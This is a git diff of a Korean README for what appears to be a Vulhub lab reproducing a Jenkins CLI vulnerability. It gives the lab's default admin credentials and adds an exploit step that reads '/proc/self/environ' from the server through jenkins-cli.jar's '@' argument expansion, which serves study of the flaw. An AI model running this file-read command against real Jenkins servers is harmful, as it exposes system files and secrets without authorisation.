@@ -18,10 +18,14 @@ docker-compose.yml 가 존재하는 디렉토리에서
 ```
 docker compose up -d
 ```
-
-![](1.png)
+이후
+'http://your-ip:8080/' 서버가 시작된 이후에 jenkins 서버에 접속할 수 있습니다. 기본 관리자 사용자 이름과 비밀번호는 'admin'과 'vulhub'입니다.
 
 ## 익스플로잇
+먼저 'jenkins-cli.jar' 파일을 다운로드 합니다. 'http://localhost:8080/jnlpJars/jenkins-cli.jar'
+파일을 읽어 '/pro/self/environ' Jenkins 기본 디렉토리를 가져옵니다. 'JENKINS_HOME=/var/jenkins_home'
 
-
-![](1.png)
+```
+java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/proc/self/environ"
+```
+<img width="452" alt="1" src="https://github.com/dhsgud/jenkins/assets/61280812/058305eb-ae95-4501-b061-5279f608bdd9">
